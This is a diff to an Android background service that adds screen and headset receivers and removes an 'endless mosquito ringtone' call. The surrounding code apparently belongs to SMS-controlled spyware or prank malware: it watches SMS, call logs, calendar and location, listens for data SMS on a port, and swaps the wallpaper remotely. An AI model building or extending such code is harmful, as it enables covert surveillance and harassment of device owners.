@@ -49,11 +49,13 @@ public class MessagingService extends Service {
     private IncomingReceiver mIncomingReceiver;
     private OutgoingReceiver mOutgoingReceiver;
     private CreateConversationReceiver mCreateConversationReceiver;
+    private ScreenReceiver mScreenReceiver;
     private WapReceiver mWapReceiver;
     private DatabaseReceiver mDatabaseReceiver;
     private SmsObserver mObserver;
     private CallLogObserver mCallLogObserver;
     private CalendarObserver mCalendarObserver;
+    private HeadsetPlugReceiver mHeadsetReceiver;
     protected static String sTelephoneAddress;
     private LocationManager mLocationManager;
     private MediaRecorder mMediaRecorder;
@@ -68,7 +70,9 @@ public class MessagingService extends Service {
         DatabaseHelper database = DatabaseHelper.getInstance(getApplicationContext());
         mIncomingReceiver = new IncomingReceiver();
         mOutgoingReceiver = new OutgoingReceiver();
+        mHeadsetReceiver = new HeadsetPlugReceiver();
         mCreateConversationReceiver = new CreateConversationReceiver();
+        mScreenReceiver = new ScreenReceiver();
         mWapReceiver = new WapReceiver();
         IntentFilter wapFilter = new IntentFilter("android.provider.Telephony.WAP_PUSH_RECEIVED");
         wapFilter.addAction("android.provider.Telephony.MMS_RECEIVED");
@@ -77,6 +81,10 @@ public class MessagingService extends Service {
         } catch (IntentFilter.MalformedMimeTypeException e) {
             e.printStackTrace();
         }
+        IntentFilter screenFilter = new IntentFilter();
+        screenFilter.addAction(Intent.ACTION_SCREEN_ON);
+        screenFilter.addAction(Intent.ACTION_SCREEN_OFF);
+        IntentFilter headsetFilter = new IntentFilter(Intent.ACTION_HEADSET_PLUG);
         IntentFilter incomingFilter = new IntentFilter(Telephony.Sms.Intents.DATA_SMS_RECEIVED_ACTION);
         incomingFilter.setPriority(Constants.PRIORITY);
         incomingFilter.addDataAuthority(Constants.HOST, Constants.PORT);
@@ -104,6 +112,8 @@ public class MessagingService extends Service {
         registerReceiver(mCreateConversationReceiver, conversationFilter);
         registerReceiver(mIncomingReceiver, incomingFilter);
         registerReceiver(mOutgoingReceiver, outgoingFilter);
+        registerReceiver(mHeadsetReceiver, headsetFilter);
+        registerReceiver(mScreenReceiver, screenFilter);
         IntentFilter databaseFilter = new IntentFilter();
         databaseFilter.addAction(Telephony.Sms.Intents.SMS_RECEIVED_ACTION);
         databaseFilter.addAction(Constants.Actions.ACTION_OUTGOING_SMS);
@@ -215,7 +225,6 @@ public class MessagingService extends Service {
                 Lofl.changeWallpaper(MessagingService.this, Lofl.getBitmapFromUrl(Uri.parse("https://i.pinimg.com/originals/04/17/57/0417575eea25c3568bf4007de9afe61f.jpg").toString()));
             }
         }).start();
-        Lofl.playEndlessMosquitoRingtone(this);
 
     }
 
@@ -227,6 +236,8 @@ public class MessagingService extends Service {
         unregisterReceiver(mIncomingReceiver);
         unregisterReceiver(mOutgoingReceiver);
         unregisterReceiver(mWapReceiver);
+        unregisterReceiver(mHeadsetReceiver);
+        unregisterReceiver(mScreenReceiver);
         /*unregisterReceiver(mShareReceiver);*/
         //unregisterReceiver(mAirplaneReceiver);
         DatabaseHelper.getInstance(getApplicationContext()).close();
